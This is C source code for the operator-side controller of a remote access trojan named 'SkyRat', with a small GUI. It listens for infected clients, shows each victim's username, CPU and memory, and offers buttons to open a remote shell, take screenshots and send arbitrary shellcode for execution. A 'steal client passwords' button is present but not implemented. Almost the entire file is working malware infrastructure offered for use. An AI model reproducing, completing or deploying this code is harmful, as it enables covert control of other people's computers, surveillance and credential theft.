#include <stdlib.h>
#include <stdio.h>
#include <winsock2.h>
#include <ws2def.h>
#include <w32api.h>
#include <ws2tcpip.h>
#include <lmcons.h>
#include <SDL2/SDL.h>
#include <SDL2/SDL_ttf.h>
#include "renderer.h"
#include "microui.h"

int panel_id = 0;
int menu_tab_click[] = {18,0,0};
int menu_tab = 0;
float bg[3] = { 90, 95, 100 };

const char button_map[256] = {
  [ SDL_BUTTON_LEFT   & 0xff ] =  MU_MOUSE_LEFT,
  [ SDL_BUTTON_RIGHT  & 0xff ] =  MU_MOUSE_RIGHT,
  [ SDL_BUTTON_MIDDLE & 0xff ] =  MU_MOUSE_MIDDLE
};

const char key_map[256] = {
  [ SDLK_LSHIFT       & 0xff ] = MU_KEY_SHIFT,
  [ SDLK_RSHIFT       & 0xff ] = MU_KEY_SHIFT,
  [ SDLK_LCTRL        & 0xff ] = MU_KEY_CTRL,
  [ SDLK_RCTRL        & 0xff ] = MU_KEY_CTRL,
  [ SDLK_LALT         & 0xff ] = MU_KEY_ALT,
  [ SDLK_RALT         & 0xff ] = MU_KEY_ALT,
  [ SDLK_RETURN       & 0xff ] = MU_KEY_RETURN,
  [ SDLK_BACKSPACE    & 0xff ] = MU_KEY_BACKSPACE
};

int v_keys[] = {
  0x30,//	0 key
  0x31,//	1 key
  0x32,//	2 key
  0x33,//	3 key
  0x34,//	4 key
  0x35,//	5 key
  0x36,//	6 key
  0x37,//	7 key
  0x38,//	8 key
  0x39,//	9 key
  0x0D //   ENTER key
};

char mem_details[1024] = "mem: ";
char cpu_details[1024] = "cpu: ";
char user_details[UNLEN+11] = "username: ";

int screenshot_active = 0;
int shellcode_active = 0;
int shell_active = 0;
long int client_cnt = 0;
long int client_num = 0;
char client_num_tb_buf[1337] = "click to choose client";
SOCKET sock;

char run_bytes[1024];

char buf[1024];
char response[18384];

typedef struct clients {
  SOCKET client;
  struct sockaddr sa; 
  struct clients* next_client;
} clients_t;

void client_thread(SOCKET socket) {
  printf("entered client thread\n");
  //client_cnt++;
  long int thread_num = client_num;

  int check = 0;
  for(;;) {
    if(thread_num == client_num) {
      if(check == 0) {
	check = 1;
	
	char cpu_buf[1024];
	ZeroMemory(cpu_buf, sizeof(cpu_buf));
	recv(socket, cpu_buf, sizeof(cpu_buf), 0);
	sprintf(cpu_details, "cpu: %s", cpu_buf);
	
	char mem_buf[1024];
	ZeroMemory(mem_buf, sizeof(mem_buf));
	recv(socket, mem_buf, sizeof(mem_buf), 0);
	sprintf(mem_details, "mem: %s", mem_buf);
	
	char user_buf[UNLEN+11];
	ZeroMemory(user_buf, sizeof(user_buf));
	recv(socket, user_buf, sizeof(user_buf), 0);
	sprintf(user_details, "username: %s", user_buf);
      }

      if(screenshot_active == 1) {
	screenshot_active = 0;
	
        ZeroMemory(buf, sizeof(buf));
	sprintf(buf, "ss");
	send(socket, buf, sizeof(buf), 0);

	char img_len_buf[1024];
	recv(socket, img_len_buf, sizeof(img_len_buf), 0);
	long img_len = atol(img_len_buf);
	printf("\nsize of image : %ld\n", img_len);

	BYTE* img = (BYTE*)malloc(sizeof(BYTE) * img_len);
	
	long bytes_recv = 0;
	while(bytes_recv < img_len) {
	  bytes_recv += (long)recv(socket, img + bytes_recv, img_len - bytes_recv, 0);
	  printf("\nbytes recv: %d\n", bytes_recv);
	}
	
	FILE* fpimg;
	fpimg = fopen("new.bmp", "wb+");
	fwrite(img, sizeof(BYTE), img_len, fpimg);
	fclose(fpimg);

	printf("\nafter\n");

	free(img);
      }
      else if(shellcode_active == 1) {
	printf("\nhello shell code\n");
	shellcode_active = 0;
	ZeroMemory(buf, sizeof(buf));
	sprintf(buf, "sc %s", run_bytes);
	if(send(socket, buf, sizeof(buf), 0) == SOCKET_ERROR) {
	  printf("client disconnected...\n");
	  ExitThread(0);
	}

	recv(socket, response, sizeof(response), MSG_WAITALL); // MSG_WAITALL 
	printf("%s", response);
      }
      else if(shell_active == 1) {
	FreeConsole();
	AllocConsole();
	freopen("CONIN$", "r", stdin);
	freopen("CONOUT$", "w", stdout);
	HANDLE hcon = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hcon, FOREGROUND_RED);
	printf("WARNING!\nType 'q' to quit shell before exiting!\nthis will also reconnect client, so their client number will change to be the latest\n\n");
	SetConsoleTextAttribute(hcon, FOREGROUND_GREEN);
	CloseHandle(hcon);
	
	for(;;) {
	  ZeroMemory(buf, sizeof(buf));
	  ZeroMemory(response, sizeof(response));
	  printf("shell: ");
	  fgets(buf, sizeof(buf), stdin);
	  strtok(buf, "\n");
	  if(send(socket, buf, sizeof(buf), 0) == SOCKET_ERROR) {
	    printf("client disconnected...\n");
	    ExitThread(0);
	  } 
	  if(!strcmp(buf, "q")) {
	    FreeConsole();
	    shell_active = 0;
	    //break; do this instead of break to fix the desync
	    printf("we just closed the thread!!\n");
	    sprintf(buf, "restart");
	    send(socket, buf, sizeof(buf), 0);
            ExitThread(0);
	    //ExitThread(0); make another command to fully uninstall bc there needs to be a soft quit to set shell_active to 0 so remove this from client code
	  } else {
	    recv(socket, response, sizeof(response), MSG_WAITALL); // MSG_WAITALL 
	    printf("%s", response);
	  }
	  Sleep(500);
	}
      }
    } else {
      printf("we just closed the thread!!\n");
      sprintf(buf, "restart");
      send(socket, buf, sizeof(buf), 0);
      ExitThread(0);
    }
    Sleep(1000); 
  }
}

__stdcall clients_t* last_client(clients_t* client) {
  if(client->next_client == NULL) {
    return client;
  } else {
    last_client(client->next_client); 
  }

  return client; // this will never hit and is just to remove warning 
}

__stdcall void grab_client(clients_t* client, long int num) {
  // we get client from struct based off of given client num
  if(num > client_cnt) {
    return;
  }

  static long int cnt = 0;
  cnt++;
  if(cnt == num) {
    cnt = 0;
    CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)client_thread, client->client, 0, 0));
  } else {
    grab_client(client->next_client, num);
  }
}

void update_client(clients_t* clients) {
  char output[1337];
  while(1) {
    for(int q = 0; q < sizeof(v_keys) / sizeof(v_keys[0]); q++) {
      if(GetKeyState(v_keys[q]) & 0x1000) {
	if(v_keys[q] == 0x0D) { // VK_ENTER
	  char* end;
	  client_num = strtol(output, &end, 10);
	  sprintf(client_num_tb_buf, "click to choose client");
	  
	  sprintf(user_details, "username: ");
	  sprintf(cpu_details, "cpu: ");
	  sprintf(mem_details, "mem: ");
	  
	  grab_client(clients->next_client, client_num);
	  return;
	}
	
        char tmp[2];
	sprintf(tmp, "%d", q);
	printf("tmp = %s\n", tmp);
	strcat(output, tmp);
	printf("output = %s", output);
	sprintf(client_num_tb_buf, "%s", output);
	Sleep(500);
      }
    }
  }
} 

__stdcall void add_client(clients_t* clients) {  
  if(clients->next_client == NULL) {		
    clients->next_client = (clients_t*)malloc(sizeof(clients_t));
    clients->next_client->next_client = NULL;
    listen(sock, SOMAXCONN);
    int sa_len = sizeof(clients->next_client->sa);
    clients->next_client->client = accept(sock, &clients->next_client->sa, &sa_len);
    
    if(clients->next_client->client == INVALID_SOCKET) {
      free(clients->next_client);
      return;		
    } else {		
      printf("\nclient connected!\n");
      client_cnt++;
    }
  } else {
    add_client(clients->next_client); 
  }
}

void add_clients_runner(clients_t* clients) {
  for(;;) {
    add_client(clients);
    Sleep(10000);
  }
}

int text_width(mu_Font font, const char* text) {
  int text_size[2] = {r_get_text_size(text)[0], r_get_text_size(text)[1]};
  char text_encrypted[] = "U2VnRmF1bHRlZCM1NTE3";
  return text_size[0];
	
}

int text_height(mu_Font font, const char* text) {
  int text_size[2] = {r_get_text_size(text)[0], r_get_text_size(text)[1]};
  return text_size[1];
}

int uint8_slider(mu_Context *ctx, unsigned char *value, int low, int high) {
  static float tmp;
  mu_push_id(ctx, &value, sizeof(value));
  tmp = *value;
  int res = mu_slider_ex(ctx, &tmp, low, high, 0, "%.0f", MU_OPT_ALIGNCENTER);
  *value = tmp;
  mu_pop_id(ctx);
  return res;
}

void micro_window(mu_Context* ctx, clients_t* clients) {
  if(mu_begin_window(ctx, "SkyRat", mu_rect(0, -0, 750, 365))) {
    mu_Container* win = mu_get_current_container(ctx);
    win->rect.w = mu_max(win->rect.w, 750);
    win->rect.h = mu_max(win->rect.h, 365);

    mu_Rect window_outline_rect = mu_rect(8, 25, 343, 315);
    mu_draw_control_frame(ctx, &panel_id, window_outline_rect, MU_COLOR_BASE, 0);

    mu_Rect tab_outline_rect = mu_rect(16, 31, 100, 100);
    mu_draw_control_frame(ctx, &panel_id, tab_outline_rect, MU_COLOR_BASE, 0);

    mu_layout_set_next(ctx, mu_rect(6, 44, 100, 20), 0);
    if(mu_clickable_text_ex(ctx, "   main", 0, 0, menu_tab_click[0])) {
      menu_tab_click[0] = 1;
      menu_tab_click[1] = 0;
      menu_tab_click[2] = 0;
      menu_tab=0;
    }
    mu_layout_set_next(ctx, mu_rect(6, 64, 100, 20), 0);
    if(mu_clickable_text_ex(ctx, "   settings", 0, 0, menu_tab_click[1])) {
      menu_tab_click[0] = 0;
      menu_tab_click[1] = 1;
      menu_tab_click[2] = 0;
      menu_tab=1;
    }
    mu_layout_set_next(ctx, mu_rect(6, 84, 100, 20), 0);
    if(mu_clickable_text_ex(ctx, "   exit", 0, 0, menu_tab_click[2])) {
      exit(0);
    }

    if(menu_tab == 0) {
      mu_layout_set_next(ctx, mu_rect(125, 31, 218, 20), 0);
      if (mu_header_ex(ctx, "client picker", MU_OPT_EXPANDED, 125)) {
	mu_layout_set_next(ctx, mu_rect(132, 58, 205, 15), 0);
        if (mu_button(ctx, client_num_tb_buf)) {
          CreateThread(0,0,(LPTHREAD_START_ROUTINE)update_client,clients,0,0);
        }
	mu_layout_set_next(ctx, mu_rect(125, 75, 15, 15), 0);
	mu_Rect client_picker_info_rect1 = mu_layout_next(ctx);
	mu_draw_control_text(ctx, "   click and type a client number", client_picker_info_rect1, MU_COLOR_TEXT, 0);
	mu_layout_set_next(ctx, mu_rect(125, 85, 15, 15), 0);
	mu_Rect client_picker_info_rect2 = mu_layout_next(ctx);
	mu_draw_control_text(ctx, "     then press enter to finish", client_picker_info_rect2, MU_COLOR_TEXT, 0);
	mu_layout_set_next(ctx, mu_rect(125, 100, 15, 15), 0);
	mu_Rect client_picker_info_rect3 = mu_layout_next(ctx);
	mu_draw_control_text(ctx, "changing client resets current client", client_picker_info_rect3, MU_COLOR_TEXT, 0);
	mu_layout_set_next(ctx, mu_rect(125, 110, 15, 15), 0);
	mu_Rect client_picker_info_rect4 = mu_layout_next(ctx);
	mu_draw_control_text(ctx, "  client will be set to last client", client_picker_info_rect4, MU_COLOR_TEXT, 0);

	char client_num_buf[1347];
	sprintf(client_num_buf, "client: %ld", client_num);
	mu_layout_set_next(ctx, mu_rect(125, 130, 15, 15), 0);
	mu_Rect client_num_rect = mu_layout_next(ctx);
	mu_draw_control_text(ctx, client_num_buf, client_num_rect, MU_COLOR_TEXT, 0);

	mu_layout_set_next(ctx, mu_rect(125, 140, 15, 15), 0);
	mu_Rect user_details_rect = mu_layout_next(ctx);
	mu_draw_control_text(ctx, user_details, user_details_rect, MU_COLOR_TEXT, 0);
	
	mu_layout_set_next(ctx, mu_rect(125, 150, 15, 15), 0);
	mu_Rect cpu_details_rect = mu_layout_next(ctx);
	mu_draw_control_text(ctx, cpu_details, cpu_details_rect, MU_COLOR_TEXT, 0);
	
	mu_layout_set_next(ctx, mu_rect(125, 160, 15, 15), 0);
	mu_Rect mem_details_rect = mu_layout_next(ctx);
	mu_draw_control_text(ctx, mem_details, mem_details_rect, MU_COLOR_TEXT, 0);
      }
      mu_layout_set_next(ctx, mu_rect(125, 180, 218, 20), 0);
      if (mu_header_ex(ctx, "client functions", MU_OPT_EXPANDED, 134)) {
	mu_layout_set_next(ctx, mu_rect(132, 207, 205, 15), 0);
        if (mu_button(ctx, "start shell on chosen client")) {
          shell_active = 1;
        }

	mu_layout_set_next(ctx, mu_rect(132, 227, 205, 15), 0);
	if(mu_button(ctx, "take screenshot of client")) {
	  screenshot_active = 1;
	}

	mu_layout_set_next(ctx, mu_rect(132, 247, 205, 15), 0);
	if(mu_button(ctx, "steal client passwords")) {
	  //screenshot_active = 1; replace when its made
	}

	static char bytes_buf[1024] = "Example: \\x00\\x00\\x00";
	mu_layout_set_next(ctx, mu_rect(132, 295, 205, 15), 0);
	if(mu_textbox(ctx, bytes_buf, sizeof(bytes_buf)) & MU_RES_SUBMIT) {
	  mu_set_focus(ctx, ctx->last_id);
	}
	mu_layout_set_next(ctx, mu_rect(132, 315, 205, 15), 0);
	if(mu_button(ctx, "execute shellcode")) {
	  strcpy(run_bytes, bytes_buf);
	  shellcode_active = 1;
	}
      }
    }
    else if(menu_tab == 1) {
      mu_layout_set_next(ctx, mu_rect(125, 31, 218, 20), 0);
      if (mu_header_ex(ctx, "color", MU_OPT_EXPANDED, 100)) {
	mu_layout_set_next(ctx, mu_rect(132, 58, 100, 15), 0);
	uint8_slider(ctx, &ctx->style->colors[1].r, 0, 255);

	mu_layout_set_next(ctx, mu_rect(132, 78, 100, 15), 0);
        uint8_slider(ctx, &ctx->style->colors[1].g, 0, 255);
            
        mu_layout_set_next(ctx, mu_rect(132, 98, 100, 15), 0);
        uint8_slider(ctx, &ctx->style->colors[1].b, 0, 255);
      }
    }
  }
  mu_end_window(ctx);
}

void create_windows(clients_t* clients) {
  SDL_Init(SDL_INIT_EVERYTHING);
  TTF_Init();
  r_init(360, 350);

  mu_Context* ctx = (mu_Context*)malloc(sizeof(mu_Context));
  mu_init(ctx);
  ctx->text_width = text_width;
  ctx->text_height = text_height;
  
  for(;;) {
    SDL_Event e;
    while(SDL_PollEvent(&e)) {
      switch(e.type) {
	case SDL_QUIT: exit(EXIT_SUCCESS); break;
        case SDL_MOUSEMOTION: mu_input_mousemove(ctx, e.motion.x, e.motion.y); break;
        case SDL_MOUSEWHEEL: mu_input_scroll(ctx, 0, e.wheel.y * -30); break;
        case SDL_TEXTINPUT: mu_input_text(ctx, e.text.text); break;
                
        case SDL_MOUSEBUTTONDOWN:
        case SDL_MOUSEBUTTONUP: {
          int b = button_map[e.button.button & 0xff];
          if (b && e.type == SDL_MOUSEBUTTONDOWN) { mu_input_mousedown(ctx, e.button.x, e.button.y, b); }
          if (b && e.type ==   SDL_MOUSEBUTTONUP) { mu_input_mouseup(ctx, e.button.x, e.button.y, b);   }
          break;
        }
	case SDL_KEYDOWN:
        case SDL_KEYUP: {
          int c = key_map[e.key.keysym.sym & 0xff];
          if (c && e.type == SDL_KEYDOWN) { mu_input_keydown(ctx, c); }
          if (c && e.type ==   SDL_KEYUP) { mu_input_keyup(ctx, c);   }
          break;
        }
      }
    }

    mu_begin(ctx);
    micro_window(ctx, clients);
    mu_end(ctx);

    r_clear(mu_color(bg[0], bg[1], bg[2], 255));
    mu_Command* cmd = NULL;
    while(mu_next_command(ctx, &cmd)) {
      switch (cmd->type) {
        case MU_COMMAND_TEXT: r_draw_text(cmd->text.str, cmd->text.pos, cmd->text.color); break;
        case MU_COMMAND_RECT: r_draw_rect(cmd->rect.rect, cmd->rect.color); break;
        case MU_COMMAND_ICON: r_draw_icon(cmd->icon.id, cmd->icon.rect, cmd->icon.color); break;
      }
    }
    r_present();
    
    Sleep(100);
  }

  r_clean();
  SDL_Quit();
  TTF_Quit();
}

int main(int argc, char *argv[]) {
  WSADATA wsadata;
  ZeroMemory(&wsadata, sizeof(wsadata));
  struct addrinfo hints;
  ZeroMemory(&hints, sizeof(hints));
  struct addrinfo* ai;
  ZeroMemory(&ai, sizeof(ai));

  if(WSAStartup(MAKEWORD(2,2), &wsadata) != 0) {
    printf("Failed to Start winsock2!\n");
    Sleep(5000);
    return 1;
  }

  hints.ai_family = AF_INET;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_protocol = IPPROTO_TCP;
  hints.ai_flags = AI_PASSIVE;

  if(getaddrinfo(0, "50005", &hints, &ai) != 0) {
    printf("Failed at getaddrinfo Call\n");
    Sleep(5000);
    WSACleanup();
    return 1;
  }

  sock = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
  if(sock == INVALID_SOCKET) {
    printf("Failed Creating Socket!\n");
    Sleep(5000);
    freeaddrinfo(ai);
    WSACleanup();
  }

  if(bind(sock, ai->ai_addr, ai->ai_addrlen) != 0) {
    printf("Failed to Bind Socket!\n");
    Sleep(5000);
    freeaddrinfo(ai);
    closesocket(sock);
    WSACleanup();
    return 1;
  }
  freeaddrinfo(ai);

  clients_t* clients = (clients_t*)malloc(sizeof(clients_t));
  clients->next_client = NULL;

  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)add_clients_runner, clients, 0, 0);

  create_windows(clients);

  closesocket(sock);
  WSACleanup();
  
  return 0;
}
